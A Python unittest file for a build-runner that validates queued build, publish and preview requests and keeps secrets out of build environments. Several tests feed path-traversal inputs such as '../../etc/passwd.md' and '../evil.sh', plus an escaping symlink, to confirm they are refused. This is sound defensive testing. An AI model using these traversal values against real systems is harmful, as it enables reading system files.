#!/usr/bin/env python3
"""Tests for scripts/build-runner.py.

The runner is the process that turns a file written by a browser-facing service
into a command run as root, so the interesting tests are the refusals: what
happens when a request names a path outside `build-requests/`, or a slug that is
really a path, or a symlink. Those are asserted here rather than discovered.

Run: python3 -m unittest discover -s scripts/tests -v
"""

from __future__ import annotations

import contextlib
import importlib.util
import io
import json
import os
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path

RUNNER_PATH = Path(__file__).resolve().parent.parent / "build-runner.py"

spec = importlib.util.spec_from_file_location("build_runner", RUNNER_PATH)
assert spec and spec.loader
runner = importlib.util.module_from_spec(spec)
spec.loader.exec_module(runner)


class RepoFixture(unittest.TestCase):
    """A throwaway checkout: build-requests/ and builds/ are all the runner reads."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.repo = Path(self._tmp.name)
        (self.repo / "build-requests").mkdir()
        (self.repo / "builds").mkdir()
        (self.repo / "scripts").mkdir()
        (self.repo / "build-requests" / "todo.md").write_text("# App\n", encoding="utf-8")
        self.queue = self.repo / ".factory" / "build-queue"
        self.queue.mkdir(parents=True)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def request(self, **overrides: object) -> dict:
        payload = {
            "v": 1,
            "job": "0123456789abcdef",
            "spec": "build-requests/todo.md",
            "slug": "todo",
            "title": "Todo",
            "requested_by": "user:test",
            "requested_at": "2026-09-13T00:00:00+00:00",
            "replace": False,
        }
        payload.update(overrides)
        return payload


class TestEnvParsing(unittest.TestCase):
    def test_parses_values_comments_and_quotes(self) -> None:
        parsed = runner.parse_env_file(
            "\n".join(
                [
                    "# a comment",
                    "OMNIROUTE_MODEL=auto/coding",
                    "QUOTED=\"a b\"",
                    "SINGLE='c d'",
                    "TRAILING=value   # trailing note",
                    "EMPTY=",
                    "not a line",
                    "1INVALID=x",
                ]
            )
        )

        self.assertEqual(parsed["OMNIROUTE_MODEL"], "auto/coding")
        self.assertEqual(parsed["QUOTED"], "a b")
        self.assertEqual(parsed["SINGLE"], "c d")
        self.assertEqual(parsed["TRAILING"], "value")
        self.assertEqual(parsed["EMPTY"], "")
        self.assertNotIn("1INVALID", parsed)


class TestEnvAllowList(unittest.TestCase):
    """A `.env` holds the Vault token and the Authentik token. A build gets neither."""

    DOTENV = {
        "OMNIROUTE_BASE_URL": "http://127.0.0.1:20128/v1",
        "OMNIROUTE_MODEL": "auto/coding",
        "ARCHON_BINARY": "/usr/local/bin/archon",
        "AUTHENTIK_TOKEN": "super-secret",
        "CERULEAN_ADMIN_PASSWORD": "super-secret",
        "VAULT_TOKEN": "super-secret",
        "TELEGRAM_BOT_TOKEN": "super-secret",
        "OIDC_CLIENT_SECRET": "super-secret",
        "STUDIO_SESSION_SECRET": "super-secret",
    }

    def test_only_allow_listed_keys_cross(self) -> None:
        env = runner.allowed_env(self.DOTENV, {"PATH": "/usr/bin"})

        self.assertEqual(env["OMNIROUTE_MODEL"], "auto/coding")
        self.assertEqual(env["ARCHON_BINARY"], "/usr/local/bin/archon")
        for secret in (
            "AUTHENTIK_TOKEN",
            "CERULEAN_ADMIN_PASSWORD",
            "VAULT_TOKEN",
            "TELEGRAM_BOT_TOKEN",
            "OIDC_CLIENT_SECRET",
            "STUDIO_SESSION_SECRET",
        ):
            self.assertNotIn(secret, env, f"{secret} must not reach a build")

    def test_real_environment_beats_the_file(self) -> None:
        env = runner.allowed_env(self.DOTENV, {"OMNIROUTE_MODEL": "from-shell", "PATH": "/usr/bin"})
        self.assertEqual(env["OMNIROUTE_MODEL"], "from-shell")

    def test_a_secret_present_in_both_sources_is_still_excluded(self) -> None:
        # "Real env wins" used to run over every key in the file, so anything in
        # both crossed into the build. A secret is no safer for arriving from the
        # environment.
        env = runner.allowed_env(
            self.DOTENV,
            {"AUTHENTIK_TOKEN": "leaked", "VAULT_TOKEN": "leaked", "PATH": "/usr/bin"},
        )
        self.assertNotIn("AUTHENTIK_TOKEN", env)
        self.assertNotIn("VAULT_TOKEN", env)

    def test_uv_is_on_the_path(self) -> None:
        # The workflow's script nodes declare `runtime: uv`; systemd's default
        # PATH does not include it, and the failure reads as a workflow bug.
        env = runner.allowed_env({}, {"PATH": "/usr/bin"})
        self.assertIn("/usr/local/bin", env["PATH"].split(":"))

    def test_extra_path_is_configurable(self) -> None:
        # The runner is no longer root, so a per-user install like
        # /root/.local/bin is unreadable to the account that runs builds. The
        # installer points this at wherever it published uv instead.
        previous = os.environ.get("BUILD_EXTRA_PATH")
        os.environ["BUILD_EXTRA_PATH"] = "/opt/uv/bin:/usr/local/bin"
        try:
            env = runner.allowed_env({}, {"PATH": "/usr/bin"})
        finally:
            if previous is None:
                os.environ.pop("BUILD_EXTRA_PATH", None)
            else:
                os.environ["BUILD_EXTRA_PATH"] = previous
        self.assertIn("/opt/uv/bin", env["PATH"].split(":"))
        self.assertNotIn("/root/.local/bin", env["PATH"].split(":"))

    def test_path_is_not_duplicated(self) -> None:
        env = runner.allowed_env({}, {"PATH": "/usr/local/bin:/usr/bin"})
        self.assertEqual(env["PATH"].count("/usr/local/bin"), 1)

    def test_delivery_env_keeps_scoped_edge_credentials_outside_agent_env(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            repo = Path(directory)
            queue = repo / ".factory" / "build-queue"
            queue.mkdir(parents=True)
            build_runner = runner.Runner(repo, queue)
            build_runner.dotenv = {
                "CERULEAN_API_TOKEN": "ceru_test_service_key",
                "SITE_EDGE_FORWARD_HOST": "192.168.1.50",
                "SITE_HOST_SUFFIX": "studio.example.test",
            }
            env = build_runner.delivery_env()
            self.assertEqual(env["CERULEAN_API_TOKEN"], "ceru_test_service_key")
            self.assertEqual(env["SITE_HOST_SUFFIX"], "studio.example.test")
            self.assertNotIn("CERULEAN_API_TOKEN", build_runner.build_env())


class TestResolveSpec(RepoFixture):
    def test_accepts_a_spec_in_build_requests(self) -> None:
        target, relative = runner.resolve_spec(self.repo, "build-requests/todo.md")
        self.assertTrue(target.is_file())
        self.assertEqual(relative, "build-requests/todo.md")

    def test_refuses_absolute_paths(self) -> None:
        with self.assertRaises(runner.RequestError):
            runner.resolve_spec(self.repo, "/etc/passwd.md")

    def test_refuses_traversal(self) -> None:
        for attempt in (
            "build-requests/../../etc/passwd.md",
            "../build-requests/todo.md",
            "build-requests/sub/../../../todo.md",
        ):
            with self.assertRaises(runner.RequestError, msg=attempt):
                runner.resolve_spec(self.repo, attempt)

    def test_refuses_non_markdown(self) -> None:
        (self.repo / "build-requests" / "notes.txt").write_text("x", encoding="utf-8")
        with self.assertRaises(runner.RequestError):
            runner.resolve_spec(self.repo, "build-requests/notes.txt")

    def test_refuses_nested_specs(self) -> None:
        (self.repo / "build-requests" / "sub").mkdir()
        (self.repo / "build-requests" / "sub" / "deep.md").write_text("x", encoding="utf-8")
        with self.assertRaises(runner.RequestError):
            runner.resolve_spec(self.repo, "build-requests/sub/deep.md")

    def test_refuses_a_symlink_that_leaves_the_directory(self) -> None:
        outside = self.repo / "outside.md"
        outside.write_text("# elsewhere\n", encoding="utf-8")
        link = self.repo / "build-requests" / "link.md"
        os.symlink(outside, link)

        with self.assertRaises(runner.RequestError):
            runner.resolve_spec(self.repo, "build-requests/link.md")

    def test_refuses_a_missing_spec(self) -> None:
        with self.assertRaises(runner.RequestError):
            runner.resolve_spec(self.repo, "build-requests/absent.md")

    def test_refuses_empty(self) -> None:
        for value in ("", "   ", None, 7):
            with self.assertRaises(runner.RequestError, msg=repr(value)):
                runner.resolve_spec(self.repo, value)


class TestResolveSlug(RepoFixture):
    def test_derives_from_the_spec_name(self) -> None:
        self.assertEqual(runner.resolve_slug({}, "build-requests/todo.md"), "todo")

    def test_accepts_a_matching_slug(self) -> None:
        self.assertEqual(runner.resolve_slug({"slug": "todo"}, "build-requests/todo.md"), "todo")

    def test_refuses_a_path_shaped_slug(self) -> None:
        for slug in ("../evil", "a/b", "UPPER", "with.dot", "-lead", "", "x" * 61):
            with self.assertRaises(runner.RequestError, msg=slug):
                runner.resolve_slug({"slug": slug}, "build-requests/todo.md")

    def test_refuses_a_slug_pointing_at_another_spec(self) -> None:
        # Otherwise one request could name another app's directory.
        with self.assertRaises(runner.RequestError):
            runner.resolve_slug({"slug": "other"}, "build-requests/todo.md")


class TestResolveBuildDir(RepoFixture):
    def test_stays_inside_builds(self) -> None:
        self.assertEqual(
            runner.resolve_build_dir(self.repo, "todo"),
            (self.repo / "builds" / "todo").resolve(),
        )

    def test_refuses_escape(self) -> None:
        with self.assertRaises(runner.RequestError):
            runner.resolve_build_dir(self.repo, "../outside")


class TestValidateRequest(RepoFixture):
    def test_accepts_a_well_formed_request(self) -> None:
        job = runner.validate_request(self.repo, self.request())
        self.assertEqual(job["slug"], "todo")
        self.assertEqual(job["spec"], "build-requests/todo.md")
        self.assertIs(job["replace"], False)

    def test_defaults_the_slug_from_the_spec(self) -> None:
        payload = self.request()
        payload.pop("slug")
        self.assertEqual(runner.validate_request(self.repo, payload)["slug"], "todo")

    def test_only_literal_true_enables_replace(self) -> None:
        for value in ("true", 1, "yes", None):
            payload = self.request(replace=value)
            self.assertIs(runner.validate_request(self.repo, payload)["replace"], False)

    def test_refuses_bad_version(self) -> None:
        with self.assertRaises(runner.RequestError):
            runner.validate_request(self.repo, self.request(v=99))

    def test_refuses_a_malformed_job_id(self) -> None:
        for job in ("nope", "../../etc", "ABCDEF0123456789", "0123456789abcde", 7):
            with self.assertRaises(runner.RequestError, msg=repr(job)):
                runner.validate_request(self.repo, self.request(job=job))

    def test_refuses_non_objects(self) -> None:
        for payload in ([], "x", 3, None):
            with self.assertRaises(runner.RequestError, msg=repr(payload)):
                runner.validate_request(self.repo, payload)

    def test_title_is_bounded_and_never_a_path(self) -> None:
        job = runner.validate_request(self.repo, self.request(title="y" * 500))
        self.assertEqual(len(job["title"]), 120)

    def test_an_absent_kind_is_an_app(self) -> None:
        # Every request written before the split means an app. Refusing them would
        # strand builds already in the queue.
        self.assertEqual(runner.validate_request(self.repo, self.request())["kind"], "app")

    def test_accepts_the_two_kinds(self) -> None:
        for kind in ("app", "website"):
            self.assertEqual(
                runner.validate_request(self.repo, self.request(kind=kind))["kind"], kind
            )

    def test_refuses_an_unknown_kind(self) -> None:
        # A typo would otherwise silently become an app, and a website built as one
        # produces source nothing can open.
        with self.assertRaises(runner.RequestError):
            runner.validate_request(self.repo, self.request(kind="web"))

    def test_publish_only_for_literal_true(self) -> None:
        for value in ("true", 1, "yes", None):
            self.assertIs(
                runner.validate_request(self.repo, self.request(publish=value))["publish"], False
            )
        self.assertIs(
            runner.validate_request(self.repo, self.request(publish=True))["publish"], True
        )


class TestPublishSteps(RepoFixture):
    """The commands a publish runs, which differ by kind and in a load-bearing way."""

    def steps(self, kind: str, plan: dict | None = None) -> list[str]:
        instance = runner.Runner(self.repo, self.queue, poll_seconds=1)
        return [" ".join(command) for command in instance.publish_steps("todo", kind, plan)]

    def planned(self) -> dict:
        return runner.parse_plan(
            {
                "name": "Todo",
                "kind": "app",
                "runtime": {"language": "python", "database": "sqlite"},
                "run": {
                    "install": "pip install -r requirements.txt",
                    "build": "",
                    "start": "python app.py",
                    "port": 8000,
                    "healthcheck": "/healthz",
                },
            }
        )

    def test_a_website_is_packaged_and_staged(self) -> None:
        steps = self.steps("website")
        self.assertTrue(any("package-website.py todo --publish" in step for step in steps))
        self.assertTrue(any("studio-sites.py --publish todo" in step for step in steps))

    def test_an_app_is_packaged_then_run_then_named(self) -> None:
        steps = self.steps("app")
        # The order is the point: naming an app before its container exists points
        # the edge at a port nothing is listening on.
        self.assertIn("package-app.py todo", steps[0])
        self.assertIn("app-runtime.py --up todo --build", steps[1])
        self.assertIn("studio-sites.py --publish todo", steps[2])
        self.assertEqual(len(steps), 3)

    def test_the_edge_is_never_told_an_app_specific_port(self) -> None:
        # The app's own vhost does that routing. If this ever grew a `--forward-port`
        # the edge would need a host per app, which is the design the wildcard
        # exists to avoid.
        for step in self.steps("app"):
            self.assertNotIn("--forward-port", step)

    def test_the_image_name_matches_what_the_packager_writes(self) -> None:
        self.assertEqual(runner.image_tag_for("todo"), "olympus-app-todo:latest")

    def test_a_planned_project_takes_the_same_three_steps_whatever_the_kind(self) -> None:
        # A website ends as an image too now: nginx is its server, and a container is
        # how you get one without a toolchain on the host.
        for kind in ("app", "website"):
            steps = self.steps(kind, self.planned())
            self.assertIn("package-project.py todo", steps[0])
            self.assertIn("app-runtime.py --up todo --build", steps[1])
            self.assertIn("studio-sites.py --publish todo", steps[2])
            self.assertEqual(len(steps), 3)

    def test_a_planned_website_is_not_staged_into_the_static_tree(self) -> None:
        # The old path copies `dist/` for the wildcard regex to serve. A planned
        # project has an exact-name vhost instead, and staging as well would leave two
        # servers claiming the same name.
        for step in self.steps("website", self.planned()):
            self.assertNotIn("package-website.py", step)
            self.assertNotIn("--publish", step.replace("studio-sites.py --publish", ""))


class TestPublishRequest(RepoFixture):
    """The publish action: same queue, different job, and its own refusals."""

    def publish(self, **overrides: object) -> dict:
        payload = {
            "v": 1,
            "job": "0123456789abcdef",
            "action": "publish",
            "slug": "todo",
            "title": "Todo",
            "kind": "website",
            "requested_by": "studio",
            "requested_at": "2026-09-13T00:00:00+00:00",
            "files": [{"path": "src/App.tsx", "contents": "export default () => null;\n"}],
        }
        payload.update(overrides)
        return payload

    def test_a_publish_needs_no_spec(self) -> None:
        # A spec is factory input. A publish manufactures nothing, and writing one
        # would leave a spec behind for the next bare `make app` to build — a
        # publish with a build as a side effect.
        job = runner.validate_request(self.repo, self.publish())
        self.assertEqual(job["action"], "publish")
        self.assertEqual(job["spec"], "")
        self.assertIsNone(job["spec_path"])

    def test_the_slug_still_has_to_be_safe(self) -> None:
        for slug in ("../escape", "a/b", "UPPER", "-leading", 7, None):
            with self.assertRaises(runner.RequestError, msg=repr(slug)):
                runner.validate_request(self.repo, self.publish(slug=slug))

    def test_files_are_required(self) -> None:
        for value in (None, [], "nope", {}):
            with self.assertRaises(runner.RequestError, msg=repr(value)):
                runner.validate_request(self.repo, self.publish(files=value))

    def test_every_file_path_is_checked(self) -> None:
        for path in ("../evil.sh", "/etc/passwd", "a/../../b", "C:/windows", "", ".."):
            with self.assertRaises(runner.RequestError, msg=repr(path)):
                runner.validate_request(
                    self.repo, self.publish(files=[{"path": path, "contents": "x"}])
                )

    def test_a_windows_separator_is_normalised_not_trusted(self) -> None:
        # Same contract as the stored files: `a\\b` is `a/b`, relative and inside
        # the app directory. Normalising is not acceptance — `..\\..` still fails,
        # which the case above covers.
        job = runner.validate_request(
            self.repo, self.publish(files=[{"path": "src\\App.tsx", "contents": "x"}])
        )
        self.assertEqual(job["files"][0]["path"], "src/App.tsx")

    def test_a_bad_entry_is_a_refusal_not_a_drop(self) -> None:
        # Dropping it would publish a site missing part of itself and report
        # success, which is the failure nobody would look for.
        with self.assertRaises(runner.RequestError):
            runner.validate_request(
                self.repo,
                self.publish(
                    files=[
                        {"path": "index.html", "contents": "x"},
                        {"path": "../escape", "contents": "x"},
                    ]
                ),
            )

    def test_a_duplicate_path_is_refused(self) -> None:
        with self.assertRaises(runner.RequestError):
            runner.validate_request(
                self.repo,
                self.publish(
                    files=[
                        {"path": "a.txt", "contents": "1"},
                        {"path": "a.txt", "contents": "2"},
                    ]
                ),
            )

    def test_an_oversized_file_is_refused(self) -> None:
        with self.assertRaises(runner.RequestError):
            runner.validate_request(
                self.repo,
                self.publish(files=[{"path": "a.txt", "contents": "x" * (runner.MAX_FILE_CHARS + 1)}]),
            )


class TestPreviewRequest(RepoFixture):
    """The preview action: a publish with one step less, and its own refusals."""

    def preview(self, **overrides: object) -> dict:
        payload = {
            "v": 1,
            "job": "0123456789abcdef",
            "action": "preview",
            "slug": "todo",
            "title": "Todo",
            "kind": "app",
            "requested_by": "studio",
            "requested_at": "2026-09-13T00:00:00+00:00",
            "files": [{"path": "src/App.tsx", "contents": "export default () => null;\n"}],
        }
        payload.update(overrides)
        return payload

    def planned(self) -> dict:
        return {
            "name": "Todo",
            "kind": "app",
            "runtime": {"language": "node", "frameworks": ["react"], "database": None},
            "run": {
                "install": "npm install",
                "build": "npm run build",
                "start": "npm start",
                "port": 3000,
                "healthcheck": "/",
            },
            "files": [{"path": "src/App.tsx", "purpose": "the app"}],
        }

    def test_a_preview_needs_no_spec(self) -> None:
        job = runner.validate_request(self.repo, self.preview(plan=self.planned()))
        self.assertEqual(job["action"], "preview")
        self.assertEqual(job["spec"], "")
        self.assertIsNone(job["spec_path"])

    def test_a_preview_carries_the_files_it_will_run(self) -> None:
        job = runner.validate_request(self.repo, self.preview(plan=self.planned()))
        self.assertEqual([entry["path"] for entry in job["files"]], ["src/App.tsx"])

    def test_files_are_required(self) -> None:
        for value in (None, [], "nope", {}):
            with self.assertRaises(runner.RequestError, msg=repr(value)):
                runner.validate_request(
                    self.repo, self.preview(plan=self.planned(), files=value)
                )

    def test_a_planned_website_can_be_previewed(self) -> None:
        # A planned website is an image with nginx in it, so there is a process to run
        # and therefore something to frame.
        job = runner.validate_request(
            self.repo, self.preview(kind="website", plan=self.planned())
        )
        self.assertEqual(job["kind"], "website")

    def test_a_website_with_no_plan_is_refused_and_says_why(self) -> None:
        # Static files are not a process. Framing the published site and calling it a
        # preview would hide that nothing was run.
        with self.assertRaises(runner.RequestError) as caught:
            runner.validate_request(self.repo, self.preview(kind="website"))
        self.assertIn("publish it to see it", str(caught.exception))

    def test_an_app_with_no_plan_is_still_previewable(self) -> None:
        # The older packager builds apps too, so this is where a project saved before
        # the planner gets a preview.
        job = runner.validate_request(self.repo, self.preview())
        self.assertEqual(job["action"], "preview")


class TestPreviewSteps(RepoFixture):
    """What a preview runs — and the command it must never run."""

    def steps(self, kind: str, plan: dict | None = None) -> list[str]:
        instance = runner.Runner(self.repo, self.queue, poll_seconds=1)
        return [" ".join(command) for command in instance.preview_steps("todo", kind, plan)]

    def planned(self) -> dict:
        return runner.parse_plan(
            {
                "name": "Todo",
                "kind": "app",
                "runtime": {"language": "python", "database": "sqlite"},
                "run": {
                    "install": "pip install -r requirements.txt",
                    "build": "",
                    "start": "python app.py",
                    "port": 8000,
                    "healthcheck": "/healthz",
                },
            }
        )

    def test_a_preview_packages_runs_and_takes_a_name_of_its_own(self) -> None:
        steps = self.steps("app", self.planned())
        self.assertIn("package-project.py todo", steps[0])
        self.assertIn("app-runtime.py --up todo --build --preview", steps[1])
        self.assertIn("studio-sites.py --preview todo", steps[2])
        self.assertEqual(len(steps), 3)

    def test_a_preview_never_registers_the_projects_own_name(self) -> None:
        # The whole difference from a publish. Registering the project's own name is
        # a public act, and a preview that did it would announce an intermediate state
        # of a project under the name people already know it by.
        for kind in ("app", "website"):
            for step in self.steps(kind, self.planned()):
                self.assertNotIn("studio-sites.py --publish", step)

    def test_the_container_is_told_to_answer_on_the_preview_name(self) -> None:
        # `--preview` is what writes the second vhost. Without it the edge has a name
        # that routes to a site container which then has nothing to serve for it.
        run = [step for step in self.steps("app", self.planned()) if "app-runtime.py" in step]
        self.assertEqual(len(run), 1)
        self.assertIn("--preview", run[0])

    def test_a_project_with_no_plan_is_packaged_by_its_own_packager(self) -> None:
        steps = self.steps("app")
        self.assertIn("package-app.py todo", steps[0])
        self.assertIn("app-runtime.py --up todo --build --preview", steps[1])


class TestMaterialize(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.build = Path(self._tmp.name)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def test_writes_the_files_it_was_given(self) -> None:
        runner.materialize(self.build, [{"path": "src/App.tsx", "contents": "hello\n"}])
        self.assertEqual((self.build / "src" / "App.tsx").read_text(encoding="utf-8"), "hello\n")

    def test_a_deleted_file_does_not_survive(self) -> None:
        # Studio's set is the whole truth: a file the operator removed there must
        # not be published because it was left on disk from the previous publish.
        runner.materialize(
            self.build,
            [{"path": "src/App.tsx", "contents": "1"}, {"path": "src/Old.tsx", "contents": "2"}],
        )
        runner.materialize(self.build, [{"path": "src/App.tsx", "contents": "3"}])

        self.assertEqual((self.build / "src" / "App.tsx").read_text(encoding="utf-8"), "3")
        self.assertFalse((self.build / "src" / "Old.tsx").exists())

    def test_a_stale_build_is_cleared(self) -> None:
        (self.build / "dist").mkdir(parents=True)
        (self.build / "dist" / "index.html").write_text("stale", encoding="utf-8")

        runner.materialize(self.build, [{"path": "src/App.tsx", "contents": "1"}])

        # `dist/` is the packager's output: it is regenerated, so a stale one can
        # never be served against source that has changed.
        self.assertFalse((self.build / "dist" / "index.html").exists())

    def test_the_install_cache_survives(self) -> None:
        # Deleting `node_modules/` would make every publish re-download the whole
        # dependency tree, and `package-lock.json` is what makes the rebuild
        # deterministic — neither is part of the payload, so neither is swept.
        (self.build / "node_modules").mkdir()
        (self.build / "node_modules" / "x.js").write_text("x", encoding="utf-8")
        (self.build / "package-lock.json").write_text("{}", encoding="utf-8")

        runner.materialize(self.build, [{"path": "src/App.tsx", "contents": "1"}])

        self.assertTrue((self.build / "node_modules" / "x.js").exists())
        self.assertTrue((self.build / "package-lock.json").exists())


class TestSiteManifest(unittest.TestCase):
    """`read_site_manifest` is what tells a packaged site from a generated one."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.build = Path(self._tmp.name)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def write(self, payload: object) -> None:
        (self.build / "site.manifest.json").write_text(json.dumps(payload), encoding="utf-8")

    def test_absent_manifest_is_none(self) -> None:
        self.assertIsNone(runner.read_site_manifest(self.build))

    def test_a_manifest_for_another_kind_is_ignored(self) -> None:
        # MANIFEST.json (the agent's) is not this, and neither is a stray file.
        self.write({"kind": "app", "entry": "index.html"})
        self.assertIsNone(runner.read_site_manifest(self.build))

    def test_reads_the_packaging_summary(self) -> None:
        self.write(
            {
                "kind": "website",
                "entry": "dist/index.html",
                "dist_files": 3,
                "dist_bytes": 1024,
                "source_files": 2,
                "zip": "site.zip",
                "built_at": "2026-09-13T00:00:00Z",
            }
        )
        site = runner.read_site_manifest(self.build)
        self.assertEqual(site["entry"], "dist/index.html")
        self.assertEqual(site["dist_files"], 3)
        self.assertEqual(site["zip"], "site.zip")

    def test_unreadable_json_is_none_not_a_crash(self) -> None:
        (self.build / "site.manifest.json").write_text("{", encoding="utf-8")
        self.assertIsNone(runner.read_site_manifest(self.build))


class TestRunnerQueue(RepoFixture):
    def make_runner(self, **kwargs: object) -> "runner.Runner":
        return runner.Runner(self.repo, self.queue, **kwargs)

    def write_request(self, payload: dict) -> Path:
        path = self.queue / f"{payload['job']}{runner.REQUEST_SUFFIX}"
        path.write_text(json.dumps(payload), encoding="utf-8")
        return path

    def test_claim_is_atomic_and_only_once(self) -> None:
        path = self.write_request(self.request())
        instance = self.make_runner()

        claimed = instance.claim(path)
        self.assertIsNotNone(claimed)
        self.assertFalse(path.exists())
        self.assertTrue(claimed and claimed.name.endswith(runner.RUNNING_SUFFIX))

        # A second runner scanning the same directory finds nothing to claim.
        self.assertIsNone(self.make_runner().claim(path))

    def test_requests_ignores_hidden_and_non_requests(self) -> None:
        self.write_request(self.request())
        (self.queue / ".hidden.request.json").write_text("{}", encoding="utf-8")
        (self.queue / "runner.heartbeat.json").write_text("{}", encoding="utf-8")
        (self.queue / "abc.status.json").write_text("{}", encoding="utf-8")

        names = [path.name for path in self.make_runner().requests()]
        self.assertEqual(names, ["0123456789abcdef.request.json"])

    def test_hidden_files_are_not_scanned(self) -> None:
        # A `..name.tmp` is a partial write; it must never be picked up as a job.
        (self.queue / "..0123456789abcdef.request.json.123.tmp").write_text("{}", encoding="utf-8")
        self.assertEqual(self.make_runner().requests(), [])

    def test_refusal_is_recorded_as_a_failed_status(self) -> None:
        payload = self.request(spec="../../etc/passwd.md")
        self.write_request(payload)
        instance = self.make_runner()

        instance.process(instance.requests()[0])

        status = json.loads((self.queue / "0123456789abcdef.status.json").read_text())
        self.assertEqual(status["state"], "failed")
        self.assertIn("Refused", status["message"])
        # The request is consumed either way — a refused job must not be retried
        # in a loop forever.
        self.assertEqual(instance.requests(), [])
        self.assertEqual(list(self.queue.glob(f"*{runner.RUNNING_SUFFIX}")), [])

    def test_recover_fails_stale_running_jobs(self) -> None:
        stale = self.queue / f"0123456789abcdef{runner.RUNNING_SUFFIX}"
        stale.write_text(json.dumps(self.request()), encoding="utf-8")
        old = time.time() - 99999
        os.utime(stale, (old, old))

        self.make_runner(timeout_seconds=60).recover()

        status = json.loads((self.queue / "0123456789abcdef.status.json").read_text())
        self.assertEqual(status["state"], "failed")
        self.assertFalse(stale.exists())

    def test_recover_leaves_a_recent_running_job_alone(self) -> None:
        # A job inside its timeout may be genuine progress from a live runner.
        live = self.queue / f"0123456789abcdef{runner.RUNNING_SUFFIX}"
        live.write_text(json.dumps(self.request()), encoding="utf-8")

        self.make_runner(timeout_seconds=3600).recover()
        self.assertTrue(live.exists())
        self.assertFalse((self.queue / "0123456789abcdef.status.json").exists())


class TestStatusWriting(RepoFixture):
    def test_status_is_written_atomically_and_readable(self) -> None:
        instance = runner.Runner(self.repo, self.queue)
        instance.write_status("0123456789abcdef", state="running", message="ok")

        path = instance.status_path("0123456789abcdef")
        self.assertEqual(json.loads(path.read_text())["state"], "running")
        # Leave no partial write behind.
        self.assertEqual(list(self.queue.glob(".*tmp")), [])

    def test_both_delivery_addresses_are_always_present(self) -> None:
        # The UI picks between "the address a preview reported" and "the address a
        # publish reported". Writing neither when a job produced neither is what keeps
        # that a choice between two fields rather than two fields and their absence.
        instance = runner.Runner(self.repo, self.queue)
        instance.write_status("0123456789abcdef", state="running", message="ok")

        payload = json.loads(instance.status_path("0123456789abcdef").read_text())
        self.assertIsNone(payload["published_url"])
        self.assertIsNone(payload["preview_url"])

    def test_a_preview_url_survives_the_field_defaulting(self) -> None:
        instance = runner.Runner(self.repo, self.queue)
        instance.write_status(
            "0123456789abcdef", state="succeeded", preview_url="https://todo.example"
        )

        payload = json.loads(instance.status_path("0123456789abcdef").read_text())
        self.assertEqual(payload["preview_url"], "https://todo.example")
        self.assertIsNone(payload["published_url"])

    def test_log_tail_reads_the_end_of_a_long_log(self) -> None:
        instance = runner.Runner(self.repo, self.queue)
        path = instance.log_path("0123456789abcdef")
        path.write_text("x" * 10000 + "TAIL", encoding="utf-8")

        tail = runner.log_tail(path, limit=100)
        self.assertTrue(tail.endswith("TAIL"))
        self.assertLessEqual(len(tail), 100)

    def test_log_tail_of_a_missing_log_is_empty(self) -> None:
        self.assertEqual(runner.log_tail(self.queue / "absent.log"), "")

    def test_read_manifest_summarises_the_artifact(self) -> None:
        build = self.repo / "builds" / "todo"
        build.mkdir()
        (build / "MANIFEST.json").write_text(
            json.dumps({"artifact": {"dir": str(build), "files": 2, "bytes": 30, "entry": "index.html"}}),
            encoding="utf-8",
        )

        summary = runner.read_manifest(build)
        self.assertEqual(summary["files"], 2)
        self.assertEqual(summary["entry"], "index.html")

    def test_read_manifest_of_an_absent_build_is_none(self) -> None:
        self.assertIsNone(runner.read_manifest(self.repo / "builds" / "nothing"))


class TestSubmit(RepoFixture):
    def test_submit_writes_a_request_using_the_runner_validation(self) -> None:
        code, payload = runner.submit(self.queue, self.repo, "build-requests/todo.md", replace=True)
        self.assertEqual(code, 0)
        assert payload is not None
        self.assertEqual(payload["slug"], "todo")

        written = json.loads(
            (self.queue / f"{payload['job']}{runner.REQUEST_SUFFIX}").read_text()
        )
        self.assertEqual(written["spec"], "build-requests/todo.md")
        self.assertIs(written["replace"], True)

    def test_submit_refuses_what_the_runner_refuses(self) -> None:
        code, payload = runner.submit(self.queue, self.repo, "../../etc/passwd.md", replace=False)
        self.assertEqual(code, 2)
        self.assertIsNone(payload)
        self.assertEqual(list(self.queue.glob(f"*{runner.REQUEST_SUFFIX}")), [])


class TestProcess(RepoFixture):
    """`process()` end to end, with a fake manufacture script instead of a model run.

    This is the part that turns a queue file into a command, records status, and
    reads the artifact back — the honest way to test it is to run it.
    """

    def fake_manufacture(self, body: str) -> None:
        script = self.repo / "scripts" / "manufacture.sh"
        script.write_text("#!/usr/bin/env bash\n" + body, encoding="utf-8")
        script.chmod(0o755)

    def fake_packager(self, kind: str = "app") -> None:
        """Stand in for the packaging step.

        Every kind now has one, and `process()` only reports a build as succeeded
        when the packager says it packaged. This is here to prove that `process()`
        runs it and reads what it wrote — scripts/tests/test_package_app.py is what
        tests the packager itself.
        """
        manifest = "app.manifest.json" if kind == "app" else "site.manifest.json"
        script = self.repo / "scripts" / runner.Runner.PACKAGERS[kind]
        script.write_text(
            "import json, pathlib, sys\n"
            "target = pathlib.Path('builds') / sys.argv[1] / %r\n"
            "target.write_text(json.dumps({'v': 1, 'kind': %r, 'slug': sys.argv[1],\n"
            "    'dist_files': 2, 'dist_bytes': 100, 'source_files': 1,\n"
            "    'entry': 'dist/index.html',\n"
            "    'image': 'olympus-app-' + sys.argv[1] + ':latest'}))\n" % (manifest, kind),
            encoding="utf-8",
        )

    def make_runner(self) -> "runner.Runner":
        return runner.Runner(self.repo, self.queue, poll_seconds=1)

    def enqueue(self, **overrides: object) -> "runner.Runner":
        payload = self.request(**overrides)
        (self.queue / f"{payload['job']}{runner.REQUEST_SUFFIX}").write_text(
            json.dumps(payload), encoding="utf-8"
        )
        instance = self.make_runner()
        instance.process(instance.requests()[0])
        return instance

    def status(self) -> dict:
        return json.loads((self.queue / "0123456789abcdef.status.json").read_text())

    def test_a_successful_build_records_the_artifact(self) -> None:
        self.fake_manufacture(
            "set -euo pipefail\n"
            "mkdir -p builds/todo\n"
            'printf %s \'{"artifact":{"dir":"builds/todo","files":1,"bytes":42,"entry":"index.html"}}\' '
            "> builds/todo/MANIFEST.json\n"
            'echo "manufacture: done"\n'
        )
        self.fake_packager("app")

        self.enqueue()
        status = self.status()

